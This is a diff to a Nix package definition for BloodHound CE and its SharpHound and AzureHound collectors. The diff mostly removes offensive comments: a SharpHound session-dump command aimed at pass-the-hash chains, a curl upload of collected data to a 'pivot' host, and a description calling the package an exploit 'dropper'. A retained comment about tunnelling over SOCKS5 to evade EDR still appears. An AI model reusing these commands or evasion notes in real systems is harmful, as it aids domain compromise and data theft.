@@ -143,30 +143,31 @@ buildGoModule rec {
     "-X github.com/specterops/bloodhound/cmd/api/src/version.minorVersion=${lib.elemAt (lib.splitString "." version) 1}"
   ];
 
+  # Embedding UI for API static serve (/assets/ loads SPA for Cypher queries
   preBuild = ''
-    echo "Embedding UI for API static serve (/assets/ loads SPA for Cypher queries like MATCH p=allShortestPaths((u:User)-[:AbusedFor*]->(g:Group {name:\"Domain Admins\"})) RETURN p)"
     mkdir -p cmd/api/src/api/static/assets
     cp -r ${ui}/dist/* cmd/api/src/api/static/assets/
   '';
 
+  # files for collectors: Sharphound / AzureHound
   postBuild = ''
     mkdir -p collectors/{sharphound,azurehound}
     cp ${sharphound} collectors/sharphound/
-    cp ${azurehound} collectors/azurehound/  # ZIPs for drops: SharpHound.exe --CollectionMethods Session --ZipFilename data.zip (dumps logons for PassTheHash chains)
+    cp ${azurehound} collectors/azurehound/
   '';
 
   installPhase = ''
     mkdir -p $out/bin $out/share/bloodhound $out/etc
-    cp $GOPATH/bin/bhapi $out/bin/bloodhound  # API binary (Neo4j ingest/query; curl -F file=@data.zip http://pivot:8080/api/admin/ingest)
+    cp $GOPATH/bin/bhapi $out/bin/bloodhound
     cp -r collectors $out/share/bloodhound/
-    cp -r ${ui}/dist $out/share/bloodhound/assets  # Fallback external serve
+    cp -r ${ui}/dist $out/share/bloodhound/assets
     cp ${src}/dockerfiles/configs/bloodhound.config.json $out/etc/bloodhound.config.json  # Patch neo4j_uri for SOCKS5 tunnel to evade EDR
   '';
 
   doCheck = false;
 
   meta = with lib; {
-    description = "BloodHound CE Nix dropper—static Go + embedded React for hybrid AD/Entra exploits (PIM consent phishing via AzureHound JSON: MATCH (a:App)-[:HasPermission]->(r:Role {name:\"Global Admin\"}) RETURN a)";
+    description = "BloodHound is a monolithic web application composed of an embedded React frontend with Sigma.js and a Go based REST API backend. It is deployed with a Postgresql application database and a Neo4j graph database, and is fed by the SharpHound and AzureHound data collectors.";
     homepage = "https://github.com/SpecterOps/BloodHound";
     license = licenses.asl20;
     platforms = platforms.linux;
